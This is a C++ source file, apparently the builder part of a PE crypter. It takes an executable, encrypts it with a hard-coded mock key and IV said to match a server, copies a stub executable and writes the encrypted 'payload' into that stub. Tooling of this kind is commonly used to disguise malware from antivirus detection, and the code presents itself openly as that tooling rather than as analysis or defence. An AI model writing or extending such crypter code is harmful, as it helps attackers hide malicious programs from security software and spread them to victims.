#include "pch.h"

#include "Cryptography.hpp"
#include "FileManager.hpp"

int main(int argc, char** argv) {

    if (argc != 4) {
		cout << "Usage: Creator.exe <original PE> <stub path> <path output>" << endl;
		return 0;
	}

    string originalPEPath(argv[1]);
    string stubPath(argv[2]);
    string outputPath(argv[3]);

    // Generate mock key and iv
    // Same as mock key and iv in server
    vector<BYTE> keyCrypt(KEY_SIZE, 0);
    vector<BYTE> ivCrypt(IV_SIZE, 0);
    for(int i = 0; i < KEY_SIZE; i++) keyCrypt[i] = i;
    for(int i = 0; i < IV_SIZE; i++) ivCrypt[i] = IV_SIZE-(i+1);

    // Create Cryptography object
    Cryptography crypt(keyCrypt, ivCrypt);
    
    // Read file to crypt
    pair<BYTE*,DWORD> file = FileManager::ReadFileBinary(originalPEPath);
    
    // Crypt file
    vector<BYTE>* cryptedVector = crypt.Crypt(file.first, file.second);

    // Write crypted file
    // FileManager::WriteFileBinary("C:\\Users\\srimp\\Desktop\\payload.bin", cryptedVector->data(), file.second);


    // Copy stub to output path
    pair<BYTE*, DWORD> stubFile = FileManager::ReadFileBinary(stubPath);
    FileManager::WriteFileBinary(outputPath, stubFile.first, stubFile.second);

    // Replace payload on output stub
    FileManager::ReplacePayloadStub(outputPath, cryptedVector);

    // Clear memory
    delete cryptedVector;
}
